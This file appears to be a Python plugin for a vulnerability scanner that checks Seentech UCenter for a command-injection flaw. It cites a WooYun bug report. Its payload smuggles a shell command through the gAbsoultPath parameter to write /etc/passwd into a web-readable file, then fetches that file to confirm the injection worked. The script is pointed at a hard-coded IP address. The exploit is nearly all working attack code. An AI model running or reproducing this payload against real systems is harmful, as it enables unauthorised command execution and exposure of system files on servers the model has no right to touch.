#!/usr/bin/env python
# -*- coding: utf-8 -*-
#refer:http://www.wooyun.org/bugs/wooyun-2010-0123369

def assign(service, arg):
    if service == 'seentech_uccenter':
        return True, arg
        
def audit(arg):
    payload1 = "ucenter/remotewh/sendcmd_start.php?gAbsoultPath=x | cat /etc/passwd > a.txt | "
    payload2 = "ucenter/remotewh/a.txt"
    curl.curl2(arg+payload1)
    code,_,res,_,_ = curl.curl2(arg+payload2)
    if code==200 and 'root:/bin/bash' in res :
        security_hole(arg+payload2)

if __name__ == '__main__':
    from dummy import *
    audit(assign('seentech_uccenter', 'https://60.223.226.154/')[1])